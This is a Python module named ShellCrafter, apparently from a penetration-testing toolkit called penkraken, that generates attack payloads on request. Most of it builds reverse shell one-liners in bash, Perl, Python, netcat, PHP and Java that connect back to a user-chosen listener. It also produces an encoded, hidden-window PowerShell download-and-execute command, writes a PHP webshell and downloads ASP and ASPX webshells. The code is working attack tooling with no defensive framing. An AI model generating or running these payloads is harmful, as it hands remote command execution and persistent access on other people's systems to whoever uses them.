#!/usr/bin/env python

import penkraken
import subprocess
import time
from base64 import b64encode

class Shellcraft():
    def __init__(self):
        self.results = []
        self.InvokeTCPurl = 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'

        x = input(f"{penkraken.colors['blue']}\n[+] Reverse shells:\n{penkraken.colors['green']}\n[1] Bash Reverse Shell\n[2] Perl Reverse Shell\n[3] Powershell reverse shell\n[4] Python Reverse Shell\n[5] Netcat Reverse Shell\n[6] PHP Reverse Shell\n[7] Java Reverse Shell\n\n{penkraken.colors['blue']}[+] Web shells:\n\n{penkraken.colors['green']}[8] PHP WebShell\n[9] ASP WebShell\n[10] ASPX WebShell\n\n{penkraken.colors['blue']}[>] Choose option: {penkraken.colors['reset']}")
        if int(x) in range(1,8):
            host = input(f"\n{penkraken.colors['blue']}[+] Enter Your Listener Host: {penkraken.colors['reset']}")
            port = input(f"\n{penkraken.colors['blue']}[+] Enter Your Listener Port: {penkraken.colors['reset']}")
            if x == '1':
                self.bash(host,port)
            elif x == '2':
                self.perl(host,port)
            elif x == '3':
                self.powershell(host,port)
            elif x == '4':
                self.python(host,port)
            elif x == '5':
                self.netcat(host,port)
            elif x == '6':
                self.php_rev(host,port)
            elif x == '7':
                self.java(host,port)

        else:
            if x == '8':
                self.php_web()
            elif x == '9':
                self.asp()
            elif x == '10':
                self.aspx()
            
    
    def bash(self,host,port):
        res = f"{penkraken.colors['green']}\n[+] Bash Reverse shell:{penkraken.colors['magenta']}bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'{penkraken.colors['reset']}"
        print(f"{penkraken.colors['green']}\n[+] Bash Reverse shell: {penkraken.colors['magenta']}bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'{penkraken.colors['reset']}")
        self.results.append(res)

    def perl(self,host,port):
        com = "perl -e 'use Socket;$i=\""+host+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        print(f"{penkraken.colors['green']}\n[+] Perl Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}")
        res = f"{penkraken.colors['green']}\n[+] Perl Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}"
        self.results.append(res)
        

    def powershell(self,host,port):
        print(f"\n{penkraken.colors['blue']}[+] Downloading Invoke-PowershellTCP...{penkraken.colors['reset']}")
        time.sleep(0.25)
        command = f"wget {self.InvokeTCPurl}"
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text=True, shell=True)
        print(f"\n{penkraken.colors['green']}[+] Invoke-PowershellTCP Downloaded successfully!{penkraken.colors['reset']}")
        time.sleep(0.25)
        print(f"\n{penkraken.colors['blue']}[+] Appending shell...{penkraken.colors['reset']}")
        time.sleep(0.25)
        command = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {host} -Port {port}' >> Invoke-PowerShellTcp.ps1"
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text=True, shell=True)
        print(f"\n{penkraken.colors['green']}[+] Invoke-PowershellTCP Modified successfully!{penkraken.colors['reset']}")
        time.sleep(0.25)
        payload = f"IEX(New-Object Net.WebClient).downloadString('http://{host}:8000/Invoke-PowerShellTcp.ps1')"
        print(f"\n{penkraken.colors['green']}[+] Encoding payload{penkraken.colors['reset']}")
        encoded = str(b64encode(payload.encode('UTF-16LE')).decode())
        time.sleep(0.5)
        print(f"\n{penkraken.colors['green']}[+] Powershell Encoded Shell: {penkraken.colors['magenta']}powershell.exe -nop -w hidden -e {encoded}{penkraken.colors['reset']}")
        print(f"\n{penkraken.colors['blue']}[!] Remeber to open a python http server on port 8000 hosting Invoke-PowerShellTcp.ps1{penkraken.colors['reset']}")
        res = f"\n{penkraken.colors['green']}[+] Powershell Encoded Shell: {penkraken.colors['magenta']}powershell.exe -nop -w hidden -e {encoded}{penkraken.colors['reset']}"
        self.results.append(res)

    def python(self,host,port):
        com = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+host+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        print(f"{penkraken.colors['green']}\n[+] Python Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}")
        res = f"{penkraken.colors['green']}\n[+] Python Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}"
        self.results.append(res)

    def netcat(self,host,port):
        com1 = f"nc -e /bin/sh {host} {port}"
        com2 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
        res1 = f"{penkraken.colors['green']}\n[+] Netcat Rev Shell 1: {penkraken.colors['magenta']}{com1}{penkraken.colors['reset']}"
        res2 = f"{penkraken.colors['green']}\n[+] Netcat Rev Shell 2: {penkraken.colors['magenta']}{com2}{penkraken.colors['reset']}"
        print(res1,res2)
        self.results.append(res1)
        self.results.append(res2)

    def php_rev(self,host,port):
        com = "php -r '$sock=fsockopen(\""+host+"\","+port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        res = f"{penkraken.colors['green']}\n[+] PHP Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}"
        print(res)
        self.results.append(res)
    
    def java(self,host,port):
        exp = ["r = Runtime.getRuntime()",
        "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"+host+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])",
        "p.waitFor()"]
        com = ''.join('\n'+x for x in exp)
        res = f"{penkraken.colors['green']}\n[+] Java Rev Shell: {penkraken.colors['magenta']}{com}{penkraken.colors['reset']}"
        print(res)
        self.results.append(res)
    
    def php_web(self):
        com = "echo '<?php system($_GET['cmd']); ?>' > simple-webshell.php"
        process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text=True, shell=True)
        res = f"{penkraken.colors['green']}\n[+] PHP Webshell exported to: {penkraken.colors['magenta']}'simple-webshell.php'{penkraken.colors['reset']}"
        print(res)
        self.results.append(res)
        

    def asp(self):
        com = "wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp"
        process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text=True, shell=True)
        time.sleep(1)
        res = f"{penkraken.colors['green']}\n[+] ASP Webshell downloaded to: {penkraken.colors['magenta']}'webshell.asp'{penkraken.colors['reset']}"
        print(res)
        self.results.append(res)

    def aspx(self):
        com = "wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx"
        process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text=True, shell=True)
        time.sleep(1)
        res = f"{penkraken.colors['green']}\n[+] ASP Webshell downloaded to: {penkraken.colors['magenta']}'cmd.aspx'{penkraken.colors['reset']}"
        print(res)
        self.results.append(res)


def Init():
    try:
        print(f"{penkraken.colors['blue']}\n[+] Welcome to the {penkraken.colors['red']}ShellCrafter{penkraken.colors['blue']} module!\n{penkraken.colors['reset']}")
        target = Shellcraft()
        out = ''
        for x in target.results:
            out += x + '\n'
        return out
        
    except:
        print(f"{penkraken.colors['red']}\n[-] Exiting Exploit Searcher Module{penkraken.colors['reset']}")
